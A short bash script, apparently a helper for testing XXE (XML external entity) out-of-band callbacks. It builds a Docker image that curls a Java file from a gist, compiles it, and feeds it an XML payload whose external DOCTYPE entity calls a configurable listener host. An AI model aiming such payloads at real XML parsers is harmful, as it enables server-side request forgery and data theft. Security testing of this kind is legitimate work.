#!/bin/bash

host=${1:-dockerhost}
port=${2:-8080}
prefix=${3:-serveme}

image_name=sidetools_java 

set +H #turn off history expansion to freely use !

if ! docker image inspect $image_name 2>/dev/null >&2;then
    echo '
        FROM openjdk:16
        #COPY xxe.java /xxe
        WORKDIR /xxe
        RUN curl -o xxe.java https://gist.githubusercontent.com/vp777/666f15da3d5e664fc952f471896b4348/raw/25fcb9c874de9167c2e2aad527a80692d600bcac/xxe.java
        RUN javac xxe.java
    ' | docker build - -t $image_name
fi

docker run --add-host dockerhost:`ip route|awk '/.*docker/ {printf "%s\n%s",$NF,$(NF-1)}'|fgrep .` --rm $image_name java xxe "<!DOCTYPE r SYSTEM \"http://${host}:${port}/${prefix}\"><r></r>"